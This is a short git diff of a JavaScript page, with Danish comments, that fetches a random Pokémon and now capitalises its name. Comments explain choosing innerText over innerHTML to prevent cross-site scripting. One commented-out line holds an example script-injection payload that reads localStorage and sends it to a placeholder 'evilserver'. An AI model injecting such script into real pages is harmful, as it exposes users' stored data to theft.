@@ -46,7 +46,10 @@ fetch(`https://pokeapi.co/api/v2/pokemon/${randomPokeId}`)
         const nameHeader = document.getElementById("pokemon-name") //dette kunne stå som global
         //variabel, men gøres ikke pga globalt scope samt at den traversere DOM'en og ved global
         //gøres det når siden loades og gør siden langsommere
-        nameHeader.innerText = result.name
+        //uppercase navn:
+        nameHeader.innerText = result.name.charAt(0).toUpperCase() + result.name.slice(1)
+        
+
         //vi bruger innerText og ikke innerHTML fordi cross site scripting
         //nameHeader.innerHTML = "<script>localStorage.getAllfetch('evilserver', {})</script>>"
         //anders egen kode til at purify html fjerne scripts:
